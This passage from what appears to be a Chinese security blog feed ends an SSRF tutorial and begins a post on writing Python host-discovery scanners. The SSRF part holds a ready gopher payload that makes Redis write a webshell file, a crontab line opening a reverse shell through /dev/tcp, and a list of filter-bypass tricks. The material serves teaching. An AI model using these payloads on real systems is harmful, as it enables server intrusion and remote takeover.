/b.php?q=1 HTTP/1.1<br>Host: 192.168.47.244<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 8<br><br>q=Myname<br><br>//url编码后的内容<br>gopher://192.168.47.244:80/_POST%20/b.php%3Fq%3D1%20HTTP/1.1%0D%0AHost%3A%20192.168.47.244%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%208%0D%0A%0D%0Aq%3DMyname<br></code></pre></td></tr></table></figure><h3 id="4-4-3-gopher-利用-redis-写文件"><a href="#4-4-3-gopher-利用-redis-写文件" class="headerlink" title="4.4.3 gopher 利用 redis 写文件"></a>4.4.3 gopher 利用 redis 写文件</h3><p>这里我们主要运用一下项目<a href="https://github.com/firebroo/sec_tools/tree/master">https://github.com/firebroo/sec_tools&#x2F;tree&#x2F;master</a></p><p>redis TCP Stream 数据读取内容编排方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">*&lt;参数数量&gt; CR LF<br>$&lt;参数 1 的字节数量&gt; CR LF<br>&lt;参数 1 的数据&gt; CR LF<br>...<br>$&lt;参数 N 的字节数量&gt; CR LF<br>&lt;参数 N 的数据&gt; CR LF<br></code></pre></td></tr></table></figure><p>与 dict 协议利用 redis 类似，也是通过 redis 实现写文件的，但是需要将 redis 的命令编写为 TCP Stream 的形式，这部分借助写好的工具脚本即可</p><p>redis.cmd文件为需要执行的redis命令，一行一条命令, e.g.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain"># 刷新缓存<br>flushall<br># 更改 rdb 文件的目录至需要写文件的目录<br>config set dir /tmp<br># 将 rdb 文件名 dbfilename 修改为写入的文件名 webshell.php<br>config set dbfilename webshell.php<br># 写入内容到dbfilename中，如果内容存在过滤或者转义，可以利用 16 进制内容写入<br>set &#x27;webshell&#x27; &#x27;&lt;?php phpinfo();?&gt;&#x27;<br># 保存写入的内容<br>save<br></code></pre></td></tr></table></figure><p>得到的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">%2a%31%0d%0a%24%38%0d%0a%66%6c%75%73%68%61%6c%6c%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%64%69%72%0d%0a%24%34%0d%0a%2f%74%6d%70%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%30%0d%0a%64%62%66%69%6c%65%6e%61%6d%65%0d%0a%24%39%0d%0a%73%68%65%6c%6c%2e%70%68%70%0d%0a%2a%33%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%38%0d%0a%77%65%62%73%68%65%6c%6c%0d%0a%24%31%38%0d%0a%3c%3f%70%68%70%20%70%68%70%69%6e%66%6f%28%29%3b%3f%3e%0d%0a%2a%31%0d%0a%24%34%0d%0a%73%61%76%65%0d%0a<br></code></pre></td></tr></table></figure><p>只需要在payload前面加上需要攻击机器的gopher:&#x2F;&#x2F;ip:port&#x2F;_使用curl就行,最终payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">gopher://127.0.0.1:6379/_%2a%31%0d%0a%24%38%0d%0a%66%6c%75%73%68%61%6c%6c%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%64%69%72%0d%0a%24%34%0d%0a%2f%74%6d%70%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%30%0d%0a%64%62%66%69%6c%65%6e%61%6d%65%0d%0a%24%39%0d%0a%73%68%65%6c%6c%2e%70%68%70%0d%0a%2a%33%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%38%0d%0a%77%65%62%73%68%65%6c%6c%0d%0a%24%31%38%0d%0a%3c%3f%70%68%70%20%70%68%70%69%6e%66%6f%28%29%3b%3f%3e%0d%0a%2a%31%0d%0a%24%34%0d%0a%73%61%76%65%0d%0a<br></code></pre></td></tr></table></figure><h3 id="4-4-4-gopher-配置定时任务反弹-shell"><a href="#4-4-4-gopher-配置定时任务反弹-shell" class="headerlink" title="4.4.4 gopher 配置定时任务反弹 shell"></a>4.4.4 gopher 配置定时任务反弹 shell</h3><p>运用一下项目<a href="https://github.com/firebroo/sec_tools/tree/master">https://github.com/firebroo/sec_tools&#x2F;tree&#x2F;master</a></p><p>在 redis.cmd 文件输入自己需要执行的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">flushall<br>config set dir /etc/<br>config set dbfilename crontab<br>config set crontab \n\n* * * * root bash -i &gt;&amp; /dev/tcp/xx.xx.xxx.xx/44444 0&gt;&amp;1 \n\n<br>save<br></code></pre></td></tr></table></figure><p>得到 tcp 数据流后利用 gopher 协议发送即可。</p><h1 id="五、ssrf-常见绕过方式"><a href="#五、ssrf-常见绕过方式" class="headerlink" title="五、ssrf 常见绕过方式"></a>五、ssrf 常见绕过方式</h1><h2 id="5-1-常用绕过方法"><a href="#5-1-常用绕过方法" class="headerlink" title="5.1 常用绕过方法"></a>5.1 常用绕过方法</h2><ol><li>@绕过；例如：<a href="http://abc.com@127.0.0.1/">http://abc.com@127.0.0.1</a></li><li>添加端口号；例如：http:127.0.0.1:8080</li><li>短地址；例如：<a href="https://0x9.me/cuGfD">https://0x9.me/cuGfD</a></li></ol><p>推荐：<a href="http://tool.chinaz.com/tools/dwz.aspx%E3%80%81https://dwz.cn/">http://tool.chinaz.com/tools/dwz.aspx、https://dwz.cn/</a></p><ol start="4"><li>可以指向任意ip的域名；例如：xip.io</li><li>ip地址转换成进制来访问；例如：192.168.0.1&#x3D;3232235521（十进制）</li><li>非HTTP协议；</li><li>DNS Rebinding；</li><li>利用[::]绕过；例如：http:&#x2F;&#x2F;[::]:80 &#x3D;&#x3D; <a href="http://127.0.0.1/">http://127.0.0.1:80</a></li><li>句号绕过；例如：127。0。0。1 &#x3D;&#x3D; 127.0.0.1</li><li>利用302跳转绕过；</li></ol><h2 id="5-2-常见限制"><a href="#5-2-常见限制" class="headerlink" title="5.2 常见限制"></a>5.2 常见限制</h2><ol><li>限制为<a href="http://www.xxx.com/">http://www.xxx.com</a> 域名</li></ol><p>采用http基本身份认证的方式绕过，即@；</p><p>利用<code>http://www.xxx.com@www.xxc.com == http://www.xxc.com</code>进行绕过</p><ol start="2"><li>限制请求IP不为内网地址</li></ol><p>当不允许ip为内网地址时：<br>    （1）采取短网址绕过<br>    （2）采取特殊域名<br>    （3）采取进制转换</p><ol start="3"><li>限制请求只为http协议</li></ol><p>（1）采取302跳转</p><p>（2）采取短地址</p><h1 id="六、SSRF-盲打"><a href="#六、SSRF-盲打" class="headerlink" title="六、SSRF 盲打"></a>六、SSRF 盲打</h1><p>当 SSRF 完全没有回显来获取 SSRF 的利用结果的时候，可以通过外带去判断是否存在 SSRF，可以通过利用 dnslog 或者 vps 主机监听来判断是否存在漏洞；</p><p>如在 vps 主机上进行监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 20044<br></code></pre></td></tr></table></figure><p>然后可能存在漏洞的位置写如 vps 监听的 ip 和端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?url=http://127.0.0.1:20044<br></code></pre></td></tr></table></figure><p>也可以通过 dnslog 平台实现<a href="https://dig.pm/%E3%80%81http://dnslog.cn/">https://dig.pm/、http://dnslog.cn/</a></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://www.cnblogs.com/miruier/p/13907150.html">https://www.cnblogs.com/miruier/p/13907150.html</a></li><li><a href="https://www.freebuf.com/articles/web/333318.html">https://www.freebuf.com/articles/web/333318.html</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>web基础漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SSRF</tag>
      
      <tag>基础漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基本扫描器的开发方法</title>
    <link href="/2025/02/20/%E8%AE%BA%E5%A6%82%E4%BD%95%E5%BC%80%E5%8F%91%E6%8E%A2%E6%B5%8B%E5%99%A8/"/>
    <url>/2025/02/20/%E8%AE%BA%E5%A6%82%E4%BD%95%E5%BC%80%E5%8F%91%E6%8E%A2%E6%B5%8B%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="一、主机存活探测器"><a href="#一、主机存活探测器" class="headerlink" title="一、主机存活探测器"></a>一、主机存活探测器</h1><h2 id="1-1-ICMP-ping-探测"><a href="#1-1-ICMP-ping-探测" class="headerlink" title="1.1 ICMP ping 探测"></a>1.1 ICMP ping 探测</h2><ul><li>原理：发送 ICMP Echo 请求（ping），如果目标回复 Echo Reply，则主机存活</li><li>实现方法：直接通过调用 ping 命令探测所在的主机端口即可；</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> platform<br><span class="hljs-keyword">import</span> ipaddress<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">icmp_ping</span>(<span class="hljs-params">ip</span>):<br>    <span class="hljs-comment"># 使用 ping 命令进行 ICMP 探测</span><br>    command = [<span class="hljs-string">&quot;ping&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>, ip] <span class="hljs-keyword">if</span> platform.system() != <span class="hljs-string">&quot;Windows&quot;</span> <span class="hljs-keyword">else</span> [<span class="hljs-string">&quot;ping&quot;</span>, <span class="hljs-string">&quot;-n&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>, ip]<br>    response = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)<br>    <span class="hljs-keyword">return</span> response.returncode == <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_icmp</span>(<span class="hljs-params">subnet_or_ip</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-keyword">in</span> subnet_or_ip:<br>            <span class="hljs-comment"># 输入的是子网</span><br>            net = ipaddress.IPv4Network(subnet_or_ip, strict=<span class="hljs-literal">False</span>)<br>            <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> net.hosts():<br>                <span class="hljs-keyword">if</span> icmp_ping(<span class="hljs-built_in">str</span>(ip)):<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Host <span class="hljs-subst">&#123;ip&#125;</span> is alive (ICMP)&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 输入的是单个IP</span><br>            <span class="hljs-keyword">if</span> icmp_ping(subnet_or_ip):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Host <span class="hljs-subst">&#123;subnet_or_ip&#125;</span> is alive (ICMP)&quot;</span>)<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Invalid subnet or IP address format.&quot;</span>)<br><br></code></pre></td></tr></table></figure><h2 id="1-2-TCP-SYN-探测"><a href="#1-2-TCP-SYN-探测" class="headerlink" title="1.2 TCP SYN 探测"></a>1.2 TCP SYN 探测</h2><ul><li>原理：发送 TCP SYN 包，如果目标返回 SYN-ACK，则主机存活（类似 <code>nmap -sS</code>）</li><li>实现方法：<ul><li>选择一个常见开放端口（如 80、443、22）</li><li>发送 TCP SYN 包，等待 SYN-ACK 响应</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tcp_syn_scan</span>(<span class="hljs-params">ip, port=<span class="hljs-number">80</span></span>):<br>    <span class="hljs-keyword">try</span>:<br>        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        sock.settimeout(<span class="hljs-number">1</span>)  <span class="hljs-comment"># 设置超时为1秒</span><br>        result = sock.connect_ex((ip, port))<br>        sock.close()<br>        <span class="hljs-keyword">return</span> result == <span class="hljs-number">0</span>  <span class="hljs-comment"># 返回是否连接成功</span><br>    <span class="hljs-keyword">except</span> socket.error:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_tcp_syn</span>(<span class="hljs-params">subnet_or_ip, port=<span class="hljs-number">80</span></span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-keyword">in</span> subnet_or_ip:<br>            net = ipaddress.IPv4Network(subnet_or_ip, strict=<span class="hljs-literal">False</span>)<br>            <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> net.hosts():<br>                <span class="hljs-keyword">if</span> tcp_syn_scan(<span class="hljs-built_in">str</span>(ip), port):<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Host <span class="hljs-subst">&#123;ip&#125;</span> is alive (TCP SYN on port <span class="hljs-subst">&#123;port&#125;</span>)&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> tcp_syn_scan(subnet_or_ip, port):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Host <span class="hljs-subst">&#123;subnet_or_ip&#125;</span> is alive (TCP SYN on port <span class="hljs-subst">&#123;port&#125;</span>)&quot;</span>)<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Invalid subnet or IP address format.&quot;</span>)<br><br></code></pre></td></tr></table></figure><h2 id="1-3-TCP-ACK-探测"><a href="#1-3-TCP-ACK-探测" class="headerlink" title="1.3 TCP ACK 探测"></a>1.3 TCP ACK 探测</h2><ul><li>原理：向目标发送一个 ACK 包，如果返回 RST 包，则主机存活</li><li>实现方法：<ul><li>选择一个常见开放端口（如 80、443、22）</li><li>发送 TCP ACK 包，等待 RST 包响应</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">tcp_ack_scan</span>(<span class="hljs-params">ip, port=<span class="hljs-number">80</span></span>):<br>    <span class="hljs-keyword">try</span>:<br>        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        sock.settimeout(<span class="hljs-number">1</span>)<br>        sock.connect_ex((ip, port))  <span class="hljs-comment"># 连接尝试</span><br>        sock.close()<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">except</span> socket.error:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_tcp_ack</span>(<span class="hljs-params">subnet_or_ip, port=<span class="hljs-number">80</span></span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-keyword">in</span> subnet_or_ip:<br>            net = ipaddress.IPv4Network(subnet_or_ip, strict=<span class="hljs-literal">False</span>)<br>            <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> net.hosts():<br>                <span class="hljs-keyword">if</span> tcp_ack_scan(<span class="hljs-built_in">str</span>(ip), port):<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Host <span class="hljs-subst">&#123;ip&#125;</span> is alive (TCP ACK on port <span class="hljs-subst">&#123;port&#125;</span>)&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> tcp_ack_scan(subnet_or_ip, port):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Host <span class="hljs-subst">&#123;subnet_or_ip&#125;</span> is alive (TCP ACK on port <span class="hljs-subst">&#123;port&#125;</span>)&quot;</span>)<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Invalid subnet or IP address format.&quot;</span>)<br><br></code></pre></td></tr></table></figure><h2 id="1-4-ARP-探测（仅适用于局域网）"><a href="#1-4-ARP-探测（仅适用于局域网）" class="headerlink" title="1.4 ARP 探测（仅适用于局域网）"></a>1.4 ARP 探测（仅适用于局域网）</h2><ul><li>原理：向目标发送 ARP 请求，如果有相应，则主机存活（适用于局域网）。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> ARP, Ether, srp<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">arp_ping</span>(<span class="hljs-params">ip</span>):<br>    <span class="hljs-comment"># 创建 ARP 请求包</span><br>    arp_request = ARP(pdst=ip)<br>    <span class="hljs-comment"># 创建以太网帧</span><br>    ether_frame = Ether(dst=<span class="hljs-string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>) / arp_request<br>    <span class="hljs-comment"># 发送请求并等待响应</span><br>    result = srp(ether_frame, timeout=<span class="hljs-number">1</span>, verbose=<span class="hljs-literal">False</span>)[<span class="hljs-number">0</span>]<br>    <br>    <span class="hljs-comment"># 如果有响应，返回主机的 IP 和 MAC 地址</span><br>    alive_hosts = []<br>    <span class="hljs-keyword">for</span> sent, received <span class="hljs-keyword">in</span> result:<br>        alive_hosts.append(&#123;<span class="hljs-string">&quot;IP&quot;</span>: received.psrc, <span class="hljs-string">&quot;MAC&quot;</span>: received.hwsrc&#125;)<br>    <br>    <span class="hljs-keyword">return</span> alive_hosts<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_network</span>(<span class="hljs-params">network</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Scanning network: <span class="hljs-subst">&#123;network&#125;</span>&quot;</span>)<br>    hosts = arp_ping(network)<br>    <br>    <span class="hljs-keyword">if</span> hosts:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nAlive hosts found:&quot;</span>)<br>        <span class="hljs-keyword">for</span> host <span class="hljs-keyword">in</span> hosts:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;IP: <span class="hljs-subst">&#123;host[<span class="hljs-string">&#x27;IP&#x27;</span>]&#125;</span> MAC: <span class="hljs-subst">&#123;host[<span class="hljs-string">&#x27;MAC&#x27;</span>]&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No hosts found.&quot;</span>)<br><br></code></pre></td></tr></table></figure><h2 id="1-5-UDP-探测"><a href="#1-5-UDP-探测" class="headerlink" title="1.5 UDP 探测"></a>1.5 UDP 探测</h2><ul><li>原理：发送 UDP 包到目标端口，如果收到 ICMP 端口不可达（Type 3，Code 3），说明主机存活。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">udp_ping</span>(<span class="hljs-params">ip, port=<span class="hljs-number">53</span></span>):<br>    <span class="hljs-keyword">try</span>:<br>        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br>        sock.settimeout(<span class="hljs-number">1</span>)<br>        sock.sendto(<span class="hljs-string">b&quot;UDP test&quot;</span>, (ip, port))<br>        response = sock.recvfrom(<span class="hljs-number">1024</span>)<br>        sock.close()<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>  <span class="hljs-comment"># 收到响应</span><br>    <span class="hljs-keyword">except</span> socket.timeout:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">except</span> socket.error:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_udp</span>(<span class="hljs-params">subnet_or_ip, port=<span class="hljs-number">53</span></span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-keyword">in</span> subnet_or_ip:<br>            net = ipaddress.IPv4Network(subnet_or_ip, strict=<span class="hljs-literal">False</span>)<br>            <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> net.hosts():<br>                <span class="hljs-keyword">if</span> udp_ping(<span class="hljs-built_in">str</span>(ip), port):<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Host <span class="hljs-subst">&#123;ip&#125;</span> is alive (UDP on port <span class="hljs-subst">&#123;port&#125;</span>)&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> udp_ping(subnet_or_ip, port):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Host <span class="hljs-subst">&#123;subnet_or_ip&#125;</span> is alive (UDP on port <span class="hljs-subst">&#123;port&#125;</span>)&quot;</span>)<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Invalid subnet or IP address format.&quot;</span>)<br><br></code></pre></td></tr></table></figure><h2 id="1-6-主机探活实现"><a href="#1-6-主机探活实现" class="headerlink" title="1.6 主机探活实现"></a>1.6 主机探活实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> platform<br><span class="hljs-keyword">import</span> ipaddress<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> ARP, Ether, srp, IP, UDP, ICMP, sr1<br><br><span class="hljs-comment"># 常见的 TCP 端口列表</span><br>COMMON_TCP_PORTS = [<span class="hljs-number">22</span>, <span class="hljs-number">53</span>, <span class="hljs-number">80</span>, <span class="hljs-number">443</span>, <span class="hljs-number">3389</span>, <span class="hljs-number">21</span>, <span class="hljs-number">25</span>, <span class="hljs-number">110</span>, <span class="hljs-number">143</span>, <span class="hljs-number">8080</span>]<br><br><span class="hljs-comment"># ICMP Ping 探测</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">icmp_ping</span>(<span class="hljs-params">ip</span>):<br>    command = [<span class="hljs-string">&quot;ping&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>, ip] <span class="hljs-keyword">if</span> platform.system() != <span class="hljs-string">&quot;Windows&quot;</span> <span class="hljs-keyword">else</span> [<span class="hljs-string">&quot;ping&quot;</span>, <span class="hljs-string">&quot;-n&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>, ip]<br>    response = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)<br>    <span class="hljs-keyword">return</span> response.returncode == <span class="hljs-number">0</span><br><br><span class="hljs-comment"># TCP SYN 探测</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tcp_syn_scan</span>(<span class="hljs-params">ip, ports=COMMON_TCP_PORTS</span>):<br>    <span class="hljs-keyword">for</span> port <span 